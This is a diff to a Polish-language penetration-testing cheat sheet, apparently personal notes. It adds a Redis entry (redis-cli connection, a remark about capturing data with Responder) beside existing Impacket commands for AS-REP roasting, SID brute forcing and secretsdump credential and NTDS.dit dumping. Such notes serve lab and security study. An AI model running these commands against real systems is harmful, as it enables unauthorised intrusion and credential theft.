@@ -30,6 +30,14 @@ python3.9 GetNPUsers.py domain/ -usersfile users.txt -dc-ip ip -outputfile hash.
 LOOKUPSID.PY:przeprowadza brutalne wymuszanie identyfikatorów SID systemu Windows w celu identyfikacji użytkowników/grup w zdalnym miejscu docelowym.
 lookupsid.py guest@ip
 
+REDIS:  Port 6379 Otwarty magazyn danych w pamięci
+REDIS-CLI:
+redis-cli -h ip         mozna wyciagnać potrzebne dane podsluchać RESPONDEREM
+komendy po zalogwaniu:
+https://redis.io/commands/info/
+
+
+
 SECRETSDUMP.PY: wykona różne techniki zrzutu tajemnic ze zdalnej maszyny bez uruchamiania żadnego agenta. Techniki obejmują odczytywanie tajemnic SAM i LSA z
 rejestrów, zrzucanie skrótów NTLM, poświadczeń w postaci zwykłego tekstu i kluczy Kerberos oraz zrzucanie NTDS.dit
 python3.9 secretsdump.py domainname/username:"password"@ip
